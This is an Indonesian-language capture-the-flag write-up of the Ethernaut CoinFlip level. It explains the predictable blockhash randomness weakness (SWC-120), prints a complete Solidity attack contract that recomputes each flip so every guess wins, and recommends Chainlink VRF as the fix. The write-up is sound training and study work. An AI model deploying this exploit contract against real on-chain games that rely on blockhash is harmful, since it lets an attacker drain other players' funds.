## coinFlip — Level 3

### Alur Logika Contract

dalam membaca contrct coinFlip aku memahami bahwa contract ini menggunakan blockhash untuk mendapat kan angka yang akan di tebak 
dengan di hitung menggunakan factor yang mereka beri dalam contract maka kita dapat menghitung blockhash yang sekarang lalu bisa menebak nya

### Vulnerability
Nama: swc-120
Penjelasan:Bad Randomness
 
### Impact
penyerang dapat menang berulang ulang karena dapat menebak angka yang akan keluar karena block hash dapat di ketahui public 

### Cara Eksploit
penyerang dapan membuat contract exploit untuk mengitung hasil dan sekalian menebak angka untuk menang 
dan karena dalam level 3 ini di suruh untuk menang 10 kali berturut itu mudah untuk di lakukan karena menggunakan contract untuk meng exploit nya dan contract exploit nya seperti ini

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    ICoinFlip public immutable target;
    uint256 LAST_FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _targetAddress) {
        target = ICoinFlip(_targetAddress);
    }

    function attack() public {
        // Menghitung hasil koin dengan logika yang persis sama seperti target
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / LAST_FACTOR;
        bool guess = coinFlip == 1 ? true : false;

        // Kirim tebakan yang pasti benar ke kontrak Ethernaut
        target.flip(guess);
    }
}

### Rekomendasi Fix
fix: jangan menggunakan blockhash untuk menghasil kan angka acak solusi nya menggunakan oracle eksternal seperti chainlink vrf untuk mendapatkan angka acak yang terdesentralisasi